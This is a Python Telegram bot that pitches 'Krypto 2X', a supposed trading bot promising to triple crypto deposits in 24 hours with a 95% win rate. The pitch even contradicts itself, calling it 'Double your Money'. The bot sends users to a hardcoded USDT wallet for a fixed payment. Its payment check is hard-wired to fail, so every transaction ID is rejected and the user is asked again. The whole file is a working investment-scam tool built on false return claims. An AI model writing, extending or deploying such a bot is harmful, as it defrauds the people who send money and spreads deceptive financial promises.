import os
import requests
from threading import Thread
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes
)

# ==========================================
# CONFIGURATION (EDIT THESE)
# ==========================================
USDT_ADDRESS = "TNeruWPC3x3iavsFcLggjawwnfPLhiPq83"
EXPECTED_AMOUNT = 10.50

# Define conversation states
SHOW_ADDRESS, WAIT_FOR_TXID = range(2)

# ==========================================
# TELEGRAM BOT LOGIC
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Step 1: Explain the bot and ask for agreement."""
    intro_text = (
        "\n"
        "🚀 *Krypto 2X: Double your Money* 🚀\n\n"
        "✨ *What is Krypto 2X?*\n\n"
        "A fully automated binary trading bot designed to *triple your money in 24 hours* 💸. With a *95% win rate*, it’s a reliable tool for maximizing returns.\n\n"
        "💼 *How It Works*\n\n"
        "1. *Deposit Funds* 💼\n"
        "   Transfer your money to the bot’s wallet.\n"
        "   No manual steps required!\n\n"
        "2. *Automated Trading* 🤖\n"
        "   The bot instantly sends funds to Quotex and starts trading. *No human intervention* involved—just pure algorithmic precision.\n\n"
        "3. *Profit Distribution* 📈\n"
        "   Once the bot achieves *3x returns*, it automatically:\n"
        "   - *Sends our fee* to our wallet address 📦\n"
        "   - *Returns your original funds* to your designated address 🔄\n"
        "   - *Transfers the profit* back to you 💰\n\n"
        "🌟 *Why Choose Krypto 2X?*\n"
        "✅ *95% win rate* for consistent performance.\n"
        "✅ *24-hour tripling* of your investment.\n"
        "✅ *Transparent process*—no hidden fees or delays.\n"
        "✅ *Fully automated*—set it and forget it!\n\n"
        "🤝 *Our Team’s Role*\n"
        "We monitor transactions and profits in real-time, but *no real person* is involved in the trading process. It’s all handled by the bot.\n\n"
        "💡 *Result?*\n"
        "You get *3x your money* in 24 hours, with *fees deducted* and *original funds returned*—smooth, fast, and secure!\n\n"
        "📈 *Ready to Level Up?*\n"
        "Let’s get your money working for you! 💼✨\n\n"
        "👇 *Click below to agree and get the deposit address.*"
    )
    keyboard = [[InlineKeyboardButton("I Agree - Show Address", callback_data="agree")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Handle both new /start commands and restarting from existing prompts
    if update.message:
        await update.message.reply_text(intro_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.callback_query.message.reply_text(intro_text, reply_markup=reply_markup, parse_mode='Markdown')
        
    return SHOW_ADDRESS

async def show_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Step 2: Show the USDT address and ask for TxID."""
    query = update.callback_query
    await query.answer()
    
    # Updated to single asterisks for Telegram Markdown compatibility
    msg = (
        f"Please send exactly *{EXPECTED_AMOUNT} USDT (TRC20)* to this address:\n\n"
        f"`{USDT_ADDRESS}`\n\n"
        "Once you have sent the payment, please *paste your Transaction ID (TxHash)* below so I can verify it."
    )
    
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text=msg, reply_markup=reply_markup, parse_mode='Markdown')
    return WAIT_FOR_TXID

async def verify_txid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Step 3: Receive TxID and verify the payment."""
    txid = update.message.text.strip()
    
    wait_msg = await update.message.reply_text("⏳ Checking the blockchain for this Transaction ID... Please wait.")
    
    # ==========================================
    # API VERIFICATION LOGIC GOES HERE
    # ==========================================
    # Mocking the verification result for now. 
    # You will integrate TronGrid or your custom API here later.
    payment_verified = False 
    
    if payment_verified:
        await wait_msg.edit_text("✅ Payment Confirmed! Your bot is now being configured.")
        return ConversationHandler.END
    else:
        await wait_msg.edit_text(
            "❌ Payment not found or invalid TxID. Make sure the transaction is complete and you pasted the correct TRC20 Hash.\n\n"
            "Please paste the correct Transaction ID, or type /start to restart."
        )
        return WAIT_FOR_TXID

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="Process cancelled. Type /start to try again.")
    return ConversationHandler.END

# ==========================================
# DUMMY WEB SERVER (FOR RENDER)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ==========================================
# MAIN EXECUTION
# ==========================================
def main() -> None:
    BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    
    if not BOT_TOKEN:
        print("Error: No TELEGRAM_BOT_TOKEN found in environment variables.")
        return

    # Start the Flask web server in a background thread
    flask_thread = Thread(target=run_flask)
    flask_thread.start()

    # Build and start the Telegram Bot
    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            SHOW_ADDRESS: [
                CallbackQueryHandler(show_address, pattern="^agree$"),
                CallbackQueryHandler(cancel, pattern="^cancel$")
            ],
            WAIT_FOR_TXID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, verify_txid),
                CallbackQueryHandler(cancel, pattern="^cancel$")
            ],
        },
        fallbacks=[CommandHandler("start", start)],
    )

    application.add_handler(conv_handler)
    
    print("Bot is polling...")
    application.run_polling()

if __name__ == "__main__":
    main()
